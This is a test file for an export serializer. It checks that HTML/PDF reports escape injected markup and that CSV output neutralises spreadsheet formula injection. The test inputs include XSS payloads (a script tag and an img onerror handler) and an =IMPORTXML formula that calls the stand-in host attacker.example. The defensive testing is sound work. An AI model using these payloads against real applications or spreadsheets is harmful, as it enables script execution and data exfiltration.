import { describe, expect, it } from "vitest";
import { serializeExport } from "../src/routes/export";

const basePayload = {
  trip_id: "trip_demo_001",
  generated_at: "2026-05-31T00:00:00.000Z",
  completion_meter: 100,
  error_count: 0,
  warning_count: 0,
  event_count: 1,
  event_ids: ["evt_1"],
  compliance: {
    completion_meter: 100,
    errors: [],
    warnings: [],
    required_event_types: [],
    present_event_types: [],
    missing_event_types: []
  }
};

describe("export serialization", () => {
  it("escapes HTML report fields before artifact generation", async () => {
    const serialized = await serializeExport("PDF", {
      ...basePayload,
      trip_id: `trip_<script>alert("x")</script>`,
      compliance: {
        ...basePayload.compliance,
        errors: [
          {
            code: "BAD_<CODE>",
            severity: "ERROR" as const,
            message: `<img src=x onerror=alert("x")>`,
            fix_hint: `Use "safe" & verified input`
          }
        ]
      },
      error_count: 1
    });

    expect(serialized.contentType).toBe("text/html");
    expect(serialized.content).not.toContain("<script>");
    expect(serialized.content).not.toContain("<img");
    expect(serialized.content).toContain("&lt;script&gt;");
    expect(serialized.content).toContain("&lt;img src=x onerror=alert(&quot;x&quot;)&gt;");
    expect(serialized.content).toContain("Use &quot;safe&quot; &amp; verified input");
  });

  it("quotes CSV fields and neutralizes spreadsheet formula injection", async () => {
    const serialized = await serializeExport("CSV", {
      ...basePayload,
      trip_id: "=IMPORTXML(\"https://attacker.example\")",
      event_ids: ["evt_1", "+SUM(1,1)"]
    });

    expect(serialized.contentType).toBe("text/csv");
    expect(serialized.content).toContain("\"'=IMPORTXML(\"\"https://attacker.example\"\")\"");
    expect(serialized.content).toContain("\"evt_1|+SUM(1,1)\"");
  });
});
